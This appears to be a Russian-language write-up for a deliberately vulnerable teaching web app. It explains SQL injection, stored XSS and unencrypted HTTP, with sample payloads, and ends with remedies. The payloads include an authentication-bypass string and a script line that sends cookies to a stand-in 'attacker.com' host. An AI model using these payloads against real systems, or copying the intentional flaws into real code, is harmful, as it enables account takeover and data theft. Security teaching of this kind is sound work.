
## Уязвимость 1: SQL Injection

### Описание

SQL Injection (SQL-инъекция) — это уязвимость, которая позволяет злоумышленнику выполнять произвольные SQL-запросы к базе данных, вводя специальные символы и SQL-код в форму или URL. В нашем коде уязвимость присутствует в запросах к базе данных, где пользовательский ввод напрямую используется для формирования SQL-запросов, например, в функциях авторизации и поиска пользователя.

### Эксплуатация

1. **Авторизация с SQL-инъекцией:**
   - Зайдите на страницу авторизации и введите следующие данные:
     - **Имя пользователя**: `admin' OR '1'='1`
     - **Пароль**: `password`
   - Запрос, сформированный в базе данных, будет выглядеть так:
     ```sql
     SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='password'
     ```
   - Из-за `OR '1'='1'` запрос вернёт первую запись в таблице `users`, позволяя авторизоваться без ввода корректного пароля.

2. **Поиск пользователя с SQL-инъекцией:**
   - Зайдите на главную страницу, выполните поиск и введите в поле поиска: `%' OR '1'='1`.
   - Это даст следующий запрос:
     ```sql
     SELECT * FROM users WHERE username LIKE '% %' OR '1'='1'
     ```
   - Условие `OR '1'='1'` вернёт все записи в таблице `users`, независимо от введённого имени пользователя.

3. **Опасность SQL-инъекции:**
   - SQL Injection может позволить злоумышленнику:
     - **Получить доступ к конфиденциальным данным**, таким как логины и пароли пользователей.
     - **Изменить данные**: добавить, изменить или удалить записи в базе данных.
     - **Удалить или разрушить базу данных**: с помощью команды `DROP TABLE`, что полностью разрушит структуру базы данных.
     - **Получить контроль над сервером**: некоторые SQL-инъекции могут быть использованы для выполнения команд на сервере, в случае, если злоумышленник получит доступ к системным функциям базы данных.

---

## Уязвимость 2: Stored XSS (Хранимая межсайтовая скриптовая инъекция)

### Описание

Stored XSS — это тип межсайтовой скриптовой инъекции, при котором вредоносный скрипт сохраняется на сервере и отображается для других пользователей. В нашем случае это достигается через форму отправки сообщений. Сообщения сохраняются без фильтрации HTML-кода, поэтому вредоносный JavaScript-код можно вставить прямо в сообщение, и при его отображении на странице он будет исполнен в браузере других пользователей.

### Эксплуатация

1. **Внедрение вредоносного скрипта:**
   - Зайдите на главную страницу, в поле для отправки сообщений введите следующий код:
     ```html
     <script>alert('XSS-атака!');</script>
     ```
   - Нажмите на кнопку «Post Message».
   - Этот скрипт будет сохранён в базе данных и отображён на странице без фильтрации. При просмотре страницы каждый пользователь увидит сообщение и в его браузере выполнится команда `alert`.

2. **Последствия Stored XSS:**
   - **Кража сессий**: злоумышленник может получить доступ к данным сессии других пользователей. Например, если они внедрят код для отправки cookies на свой сервер:
     ```html
     <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
     ```
   - **Фишинг**: внедрение форм или перенаправлений для кражи личной информации.
   - **Обход авторизации**: злоумышленник может заставить пользователя выполнить произвольные действия от его имени.
   - **Распространение атак**: при публикации вредоносного скрипта на общей странице он будет отображаться каждому пользователю, увеличивая охват атаки.

---

## Уязвимость 3: Использование незащищённого HTTP

### Описание

Использование незащищённого HTTP-протокола означает, что данные передаются в виде обычного текста, без шифрования. Это позволяет злоумышленникам, перехватившим трафик (например, через публичный Wi-Fi), увидеть всю передаваемую информацию, включая логины, пароли и cookies сессии.

### Эксплуатация

1. **Перехват трафика через незащищённый HTTP (SOON REALIZ)**:
   - Злоумышленник может использовать инструмент перехвата трафика, такой как Wireshark, чтобы увидеть передаваемые данные.
   - В момент ввода логина и пароля злоумышленник может перехватить передаваемые данные и получить доступ к данным пользователя.
   - Cookie также передаются через HTTP без шифрования, что позволяет злоумышленнику скопировать идентификатор сессии и использовать его для входа от имени пользователя.

2. **Последствия использования незащищённого HTTP(SOON REALIZ)**:
   - **Кража логинов и паролей**: все данные передаются в открытом виде и могут быть перехвачены.
   - **Угон сессии(SOON REALIZ)**: перехваченные cookies позволяют злоумышленнику выполнять действия от имени пользователя, пока его сессия активна.
   - **Доступ к конфиденциальной информации(SOON REALIZ)**: при отправке данных, таких как личные сообщения, адреса и другие, они также могут быть перехвачены и использованы злоумышленником.

---

## Заключение

Эти уязвимости демонстрируют, как слабая защита данных и отсутствие фильтрации вводимой информации может привести к серьёзным последствиям. Вот несколько практик, которые могут помочь предотвратить эти уязвимости:

1. **Защита от SQL-инъекций**:
   - Используйте параметризованные запросы и ORM-библиотеки (например, SQLAlchemy).
2. **Защита от XSS**:
   - Фильтруйте или экранируйте пользовательский ввод с помощью `html.escape()`.
3. **Шифрование трафика**:
   - Обеспечьте HTTPS-соединение, установив SSL/TLS-сертификат на сервере.
